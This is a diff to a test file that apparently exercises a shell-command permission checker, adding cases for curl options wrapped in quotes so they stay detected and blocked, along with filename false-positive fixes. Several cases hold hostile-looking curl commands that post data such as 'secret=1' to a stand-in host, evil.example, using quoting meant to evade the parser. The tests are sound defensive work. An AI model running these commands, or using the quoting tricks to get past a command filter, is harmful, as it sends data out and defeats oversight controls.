@@ -112,6 +112,21 @@ check('curl -XPOST -o /tmp/x https://evil.example/x', { category: 'network', all
 // (=-s -o data) and glue `-soxH:y` (=-s -o "xH:y") must stay allowed.
 check('curl -sodata -o /tmp/x https://example.com/x', { category: 'file_write', allow: true, pathsProtected: false })
 check('curl -soxH:y -o /tmp/x https://example.com/x', { category: 'file_write', allow: true, pathsProtected: false })
+// B-4 (dsh re-review): an option wholly wrapped in quotes is shell syntax —
+// curl receives the bare option, so the flags must still be detected.
+check('curl "-HX:y" -o /tmp/x https://evil.example/x', { category: 'network', allow: false })
+check("curl '-HX:y' -o /tmp/x https://evil.example/x", { category: 'network', allow: false })
+check('curl -sL "-dsecret=1" -o /tmp/x https://evil.example/x', { category: 'network', allow: false })
+check('curl "-Kcfg" -o /tmp/x https://evil.example/x', { category: 'network', allow: false })
+check('curl "-k" -o /tmp/x https://evil.example/x', { category: 'network', allow: false })
+check('curl "--insecure" -o /tmp/x https://evil.example/x', { category: 'network', allow: false })
+check('curl "--config" cfg -o /tmp/x https://evil.example/x', { category: 'network', allow: false })
+check('curl "-u" a:b -o /tmp/x https://evil.example/x', { category: 'network', allow: false })
+// FP-B5 fix: `-o` at token START with a pure-alphanumeric uppercase name is a
+// filename (`-oT` = output to file `T`), NOT a cluster — must not expand into
+// fabricated blocked flags.
+check('curl -oT https://example.com/x', { category: 'file_write', allow: false, pathsProtected: false })
+check('curl -oKcfg -o /tmp/x https://example.com/x', { category: 'file_write', allow: true, pathsProtected: false })
 check('wget http://x/f', { category: 'network', allow: false })
 check('git push origin main', { category: 'vcs_remote', allow: false })
 check('git clone https://x/repo', { category: 'vcs_remote', allow: false })
